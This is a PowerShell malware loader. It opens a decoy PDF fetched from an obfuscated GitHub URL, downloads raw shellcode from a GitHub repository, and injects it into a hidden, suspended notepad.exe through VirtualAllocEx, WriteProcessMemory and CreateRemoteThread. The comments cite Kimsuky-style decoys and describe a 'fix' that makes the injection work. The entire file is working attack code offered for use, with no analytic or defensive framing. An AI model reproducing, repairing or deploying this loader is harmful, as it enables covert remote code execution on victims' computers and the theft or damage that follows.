$ErrorActionPreference = 'SilentlyContinue'

# Decoy PDF (Kimsuky-style distraction)
$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcnNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWtheV9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
$pdfPath = "$env:TEMP\nakaz.pdf"
Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing
Start-Process $pdfPath

# Download raw shellcode from GitHub (exactly as you had – confirmed valid from local test)
$shellcodeUrl = "https://github.com/astro-opensource/cloud-sync-tools/raw/refs/heads/main/assets/payload.bin"
$shellcode = (Invoke-WebRequest -Uri $shellcodeUrl -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing).Content

# Win32 API definitions (now includes CreateRemoteThread)
$code = @'
using System;
using System.Runtime.InteropServices;

public class Inject {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
}
'@
Add-Type $code

# Create suspended notepad.exe (hidden window – decoy process hosts the shellcode)
$si = New-Object Inject+STARTUPINFO
$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$si.dwFlags = 0x00000001  # STARTF_USESHOWWINDOW
$si.wShowWindow = 0       # SW_HIDE

$pi = New-Object Inject+PROCESS_INFORMATION

$targetExe = "$env:SystemRoot\System32\notepad.exe"
$success = [Inject]::CreateProcess($null, $targetExe, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x00000004, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)

if (-not $success) { exit }

$hProcess = $pi.hProcess
$hThread  = $pi.hThread

# Allocate executable memory in the remote process
$addr = [Inject]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x1000, 0x40)
if ($addr -eq [IntPtr]::Zero) {
    [Inject]::CloseHandle($hProcess)
    [Inject]::CloseHandle($hThread)
    exit
}

# Write shellcode
$bytesWritten = [IntPtr]::Zero
[Inject]::WriteProcessMemory($hProcess, $addr, $shellcode, $shellcode.Length, [ref]$bytesWritten)

# === FIXED: Create remote thread to run our shellcode (this was the missing piece) ===
$remoteThread = [Inject]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

if ($remoteThread -ne [IntPtr]::Zero) {
    [Inject]::CloseHandle($remoteThread)  # clean up
}

# Resume the main thread so notepad.exe runs normally (hidden)
[Inject]::ResumeThread($hThread)

# Cleanup
[Inject]::CloseHandle($hProcess)
[Inject]::CloseHandle($hThread)
